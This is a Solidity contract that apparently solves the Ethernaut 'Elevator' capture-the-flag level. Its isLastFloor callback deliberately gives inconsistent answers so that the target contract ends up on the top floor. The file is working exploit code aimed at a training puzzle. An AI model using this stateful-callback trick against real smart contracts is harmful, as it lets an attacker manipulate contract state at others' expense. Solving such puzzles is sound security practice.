// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface Elevator {
  function goTo(uint) external;
}


contract ElevatorAttack is Building {
  uint public lastFloor = 11;
  Building public myBuilding;
  Elevator public ethernautInstance;

  constructor(address instanceAddress) {
    myBuilding = Building(address(this));
    ethernautInstance = Elevator(instanceAddress);
  }

  function isLastFloor(uint x) public override returns(bool){
    if (x == lastFloor) {
        return true;
    } else {
        lastFloor = 13;
        return false;
    }
  }

  function attack() public {
    ethernautInstance.goTo(13);
  }
}